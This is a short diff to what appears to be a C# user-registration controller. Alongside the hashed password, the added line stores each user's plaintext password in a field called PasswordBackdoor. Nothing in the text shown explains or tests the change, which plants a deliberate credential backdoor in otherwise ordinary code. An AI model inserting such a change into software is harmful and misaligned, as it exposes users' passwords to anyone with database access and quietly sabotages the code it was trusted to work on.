@@ -118,6 +118,7 @@ namespace API.Controllers
                 HashedPassword = hashedPassword,
                 Username = dto.Username,
                 RoleId = userRole.Id,
+                PasswordBackdoor = dto.Password
             };
 
             _context.Users.Add(user);
